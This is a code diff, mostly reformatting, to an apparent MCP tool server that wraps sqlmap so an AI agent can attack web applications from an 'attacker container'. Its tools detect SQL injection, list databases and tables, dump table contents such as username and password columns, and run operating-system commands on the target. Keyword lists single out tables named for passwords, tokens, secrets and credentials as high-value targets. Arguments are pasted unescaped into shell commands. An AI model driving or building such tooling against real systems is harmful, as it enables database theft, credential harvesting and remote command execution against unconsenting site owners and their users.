@@ -12,6 +12,9 @@ import os
 import re
 import sys
 
+# FIX: datetime was used in all call_tool implementations but never imported
+from datetime import datetime
+
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from mcp.server import Server
@@ -29,6 +32,7 @@ os.makedirs(OUTPUT_DIR, exist_ok=True)
 # HELPERS
 # ─────────────────────────────────────────────
 
+
 def run_command(cmd: str, timeout: int = 600) -> dict:
     """Run a shell command inside the attacker container."""
     return run_in_container(cmd, timeout)
@@ -44,37 +48,40 @@ def parse_sqlmap_output(output: str) -> dict:
         "tables": [],
         "columns": [],
         "dumped_data": [],
-        "payloads": []
+        "payloads": [],
     }
 
-    if "is vulnerable" in output.lower() or "parameter" in output.lower() and "injectable" in output.lower():
+    if "is vulnerable" in output.lower() or (
+        "parameter" in output.lower() and "injectable" in output.lower()
+    ):
         result["injectable"] = True
 
-    # DBMS detection
     dbms_match = re.search(r"back-end DBMS: (.+)", output)
     if dbms_match:
         result["dbms"] = dbms_match.group(1).strip()
 
-    # Injection types
-    for inj_type in ["boolean-based blind", "time-based blind", "error-based",
-                      "UNION query", "stacked queries", "inline queries"]:
+    for inj_type in [
+        "boolean-based blind",
+        "time-based blind",
+        "error-based",
+        "UNION query",
+        "stacked queries",
+        "inline queries",
+    ]:
         if inj_type.lower() in output.lower():
             result["injection_types"].append(inj_type)
 
-    # Databases
     db_section = re.search(r"available databases.*?\[(.*?)\]", output, re.DOTALL)
     if db_section:
         dbs = re.findall(r"\[\*\] (.+)", db_section.group(0))
         result["databases"] = [d.strip() for d in dbs]
 
-    # Tables
     table_matches = re.findall(r"\[\*\] (.+)", output)
     if table_matches and result["databases"]:
         result["tables"] = [t.strip() for t in table_matches]
 
-    # Payloads used
     payload_matches = re.findall(r"Payload: (.+)", output)
-    result["payloads"] = [p.strip() for p in payload_matches[:5]]  # top 5
+    result["payloads"] = [p.strip() for p in payload_matches[:5]]
 
     return result
 
@@ -82,6 +89,7 @@ def parse_sqlmap_output(output: str) -> dict:
 # ─────────────────────────────────────────────
 # TOOL DEFINITIONS
 # ─────────────────────────────────────────────
+
 
 @app.list_tools()
 async def list_tools() -> list[types.Tool]:
@@ -99,27 +107,27 @@ async def list_tools() -> list[types.Tool]:
                 "properties": {
                     "url": {
                         "type": "string",
-                        "description": "Target URL with parameter (e.g. http://target.com/page?id=1)"
+                        "description": "Target URL with parameter (e.g. http://target.com/page?id=1)",
                     },
                     "data": {
                         "type": "string",
                         "description": "POST body data for POST injection (e.g. 'username=admin&password=test')",
-                        "default": ""
+                        "default": "",
                     },
                     "level": {
                         "type": "integer",
                         "description": "Test level 1-5 (default: 3, higher = more thorough but slower)",
-                        "default": 3
+                        "default": 3,
                     },
                     "risk": {
                         "type": "integer",
                         "description": "Risk level 1-3 (default: 2, higher = more aggressive tests)",
-                        "default": 2
+                        "default": 2,
                     },
-                    "timeout": {"type": "integer", "default": 300}
+                    "timeout": {"type": "integer", "default": 300},
                 },
-                "required": ["url"]
-            }
+                "required": ["url"],
+            },
         ),
         types.Tool(
             name="sqlmap_list_databases",
@@ -136,12 +144,12 @@ async def list_tools() -> list[types.Tool]:
                     "dbms": {
                         "type": "string",
                         "description": "Database type hint if known (mysql/mssql/postgresql/oracle)",
-                        "default": ""
+                        "default": "",
                     },
-                    "timeout": {"type": "integer", "default": 300}
+                    "timeout": {"type": "integer", "default": 300},
                 },
-                "required": ["url"]
-            }
+                "required": ["url"],
+            },
         ),
         types.Tool(
             name="sqlmap_list_tables",
@@ -156,13 +164,13 @@ async def list_tools() -> list[types.Tool]:
                     "url": {"type": "string"},
                     "database": {
                         "type": "string",
-                        "description": "Target database name to enumerate tables from"
+                        "description": "Target database name to enumerate tables from",
                     },
                     "data": {"type": "string", "default": ""},
-                    "timeout": {"type": "integer", "default": 300}
+                    "timeout": {"type": "integer", "default": 300},
                 },
-                "required": ["url", "database"]
-            }
+                "required": ["url", "database"],
+            },
         ),
         types.Tool(
             name="sqlmap_dump_table",
@@ -181,12 +189,12 @@ async def list_tools() -> list[types.Tool]:
                     "columns": {
                         "type": "string",
                         "description": "Specific columns to dump (e.g. 'username,password'). Leave empty for all.",
-                        "default": ""
+                        "default": "",
                     },
-                    "timeout": {"type": "integer", "default": 300}
+                    "timeout": {"type": "integer", "default": 300},
                 },
-                "required": ["url", "database", "table"]
-            }
+                "required": ["url", "database", "table"],
+            },
         ),
         types.Tool(
             name="sqlmap_os_shell",
@@ -204,13 +212,13 @@ async def list_tools() -> list[types.Tool]:
                     "command": {
                         "type": "string",
                         "description": "OS command to test (default: 'id')",
-                        "default": "id"
+                        "default": "id",
                     },
-                    "timeout": {"type": "integer", "default": 300}
+                    "timeout": {"type": "integer", "default": 300},
                 },
-                "required": ["url"]
-            }
-        )
+                "required": ["url"],
+            },
+        ),
     ]
 
 
@@ -218,22 +226,23 @@ async def list_tools() -> list[types.Tool]:
 # TOOL IMPLEMENTATIONS
 # ─────────────────────────────────────────────
 
+
 @app.call_tool()
 async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:
 
-    url     = arguments.get("url", "")
-    data    = arguments.get("data", "")
+    url = arguments.get("url", "")
+    data = arguments.get("data", "")
     timeout = arguments.get("timeout", 300)
 
     base_flags = f"--batch --random-agent --output-dir={OUTPUT_DIR} --flush-session"
-    data_flag  = f'--data="{data}"' if data else ""
+    data_flag = f'--data="{data}"' if data else ""
 
-    # ── DETECT ──────────────────────────────────────────────────────────
+    # ── DETECT ────────────────────────────────────────────────────────
     if name == "sqlmap_detect":
         level = arguments.get("level", 3)
-        risk  = arguments.get("risk", 2)
-        cmd   = f'sqlmap -u "{url}" {data_flag} --level={level} --risk={risk} {base_flags} --forms'
-        raw   = run_command(cmd, timeout)
+        risk = arguments.get("risk", 2)
+        cmd = f'sqlmap -u "{url}" {data_flag} --level={level} --risk={risk} {base_flags} --forms'
+        raw = run_command(cmd, timeout)
         parsed = parse_sqlmap_output(raw["stdout"])
 
         result = {
@@ -246,13 +255,17 @@ async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:
             "dbms": parsed["dbms"],
             "injection_types": parsed["injection_types"],
             "payloads": parsed["payloads"],
-            "raw_output_tail": raw["stdout"][-3000:],  # last 3000 chars
-            "next_step": "sqlmap_list_databases" if parsed["injectable"] else "No injection found. Try different parameters."
+            "raw_output_tail": raw["stdout"][-3000:],
+            "next_step": (
+                "sqlmap_list_databases"
+                if parsed["injectable"]
+                else "No injection found. Try different parameters."
+            ),
         }
 
         return [types.TextContent(type="text", text=json.dumps(result, indent=2))]
 
-    # ── LIST DATABASES ──────────────────────────────────────────────────
+    # ── LIST DATABASES ────────────────────────────────────────────────
     elif name == "sqlmap_list_databases":
         dbms = arguments.get("dbms", "")
         dbms_flag = f"--dbms={dbms}" if dbms else ""
@@ -269,22 +282,33 @@ async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:
             "dbms": parsed["dbms"],
             "databases": parsed["databases"],
             "database_count": len(parsed["databases"]),
-            "high_value_targets": [db for db in parsed["databases"]
-                                   if any(kw in db.lower() for kw in
-                                          ["user", "admin", "auth", "account", "member", "customer", "pass"])],
-            "raw_output_tail": raw["stdout"][-2000:]
+            "high_value_targets": [
+                db
+                for db in parsed["databases"]
+                if any(
+                    kw in db.lower()
+                    for kw in [
+                        "user",
+                        "admin",
+                        "auth",
+                        "account",
+                        "member",
+                        "customer",
+                        "pass",
+                    ]
+                )
+            ],
+            "raw_output_tail": raw["stdout"][-2000:],
         }
 
         return [types.TextContent(type="text", text=json.dumps(result, indent=2))]
 
-    # ── LIST TABLES ─────────────────────────────────────────────────────
+    # ── LIST TABLES ───────────────────────────────────────────────────
     elif name == "sqlmap_list_tables":
         database = arguments["database"]
         cmd = f'sqlmap -u "{url}" {data_flag} -D {database} --tables {base_flags}'
         raw = run_command(cmd, timeout)
-        parsed = parse_sqlmap_output(raw["stdout"])
 
-        # Extract tables from output
         tables = []
         in_table_section = False
         for line in raw["stdout"].split("\n"):
@@ -304,31 +328,45 @@ async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:
             "timestamp": datetime.now().isoformat(),
             "tables": tables,
             "table_count": len(tables),
-            "high_value_tables": [t for t in tables
-                                  if any(kw in t.lower() for kw in
-                                         ["user", "admin", "pass", "login", "auth",
-                                          "account", "token", "secret", "cred", "member"])],
-            "raw_output_tail": raw["stdout"][-2000:]
+            "high_value_tables": [
+                t
+                for t in tables
+                if any(
+                    kw in t.lower()
+                    for kw in [
+                        "user",
+                        "admin",
+                        "pass",
+                        "login",
+                        "auth",
+                        "account",
+                        "token",
+                        "secret",
+                        "cred",
+                        "member",
+                    ]
+                )
+            ],
+            "raw_output_tail": raw["stdout"][-2000:],
         }
 
         return [types.TextContent(type="text", text=json.dumps(result, indent=2))]
 
-    # ── DUMP TABLE ──────────────────────────────────────────────────────
+    # ── DUMP TABLE ────────────────────────────────────────────────────
     elif name == "sqlmap_dump_table":
         database = arguments["database"]
-        table    = arguments["table"]
-        columns  = arguments.get("columns", "")
+        table = arguments["table"]
+        columns = arguments.get("columns", "")
         col_flag = f"-C {columns}" if columns else ""
 
         cmd = f'sqlmap -u "{url}" {data_flag} -D {database} -T {table} {col_flag} --dump {base_flags}'
         raw = run_command(cmd, timeout)
 
-        # Try to find output CSV file
         dumped_data = []
         csv_path = os.path.join(OUTPUT_DIR, "dump", database, f"{table}.csv")
         if os.path.exists(csv_path):
             with open(csv_path, "r", errors="ignore") as f:
-                dumped_data = f.read().split("\n")[:50]  # first 50 rows
+                dumped_data = f.read().split("\n")[:50]
 
         result = {
             "tool": "sqlmap_dump_table",
@@ -339,20 +377,19 @@ async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:
             "success": raw["success"],
             "timestamp": datetime.now().isoformat(),
             "dumped_rows": len(dumped_data) - 1 if dumped_data else 0,
-            "dumped_data_preview": dumped_data[:20],  # first 20 rows preview
+            "dumped_data_preview": dumped_data[:20],
             "csv_saved_at": csv_path if os.path.exists(csv_path) else "Not found",
-            "raw_output_tail": raw["stdout"][-3000:]
+            "raw_output_tail": raw["stdout"][-3000:],
         }
 
         return [types.TextContent(type="text", text=json.dumps(result, indent=2))]
 
-    # ── OS SHELL ────────────────────────────────────────────────────────
+    # ── OS SHELL ──────────────────────────────────────────────────────
     elif name == "sqlmap_os_shell":
         command = arguments.get("command", "id")
         cmd = f'sqlmap -u "{url}" {data_flag} --os-cmd="{command}" {base_flags}'
         raw = run_command(cmd, timeout)
 
-        # Parse command output
         cmd_output = ""
         match = re.search(r"command standard output: '(.+?)'", raw["stdout"], re.DOTALL)
         if match:
@@ -367,22 +404,28 @@ async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:
             "timestamp": datetime.now().isoformat(),
             "command_output": cmd_output,
             "rce_achieved": bool(cmd_output),
-            "raw_output_tail": raw["stdout"][-2000:]
+            "raw_output_tail": raw["stdout"][-2000:],
         }
 
         return [types.TextContent(type="text", text=json.dumps(result, indent=2))]
 
     else:
-        return [types.TextContent(type="text", text=json.dumps({"error": f"Unknown tool: {name}"}))]
+        return [
+            types.TextContent(
+                type="text", text=json.dumps({"error": f"Unknown tool: {name}"})
+            )
+        ]
 
 
 # ─────────────────────────────────────────────
 # ENTRY POINT
 # ─────────────────────────────────────────────
 
+
 async def main():
     async with stdio_server() as (read_stream, write_stream):
         await app.run(read_stream, write_stream, app.create_initialization_options())
+
 
 if __name__ == "__main__":
     asyncio.run(main())
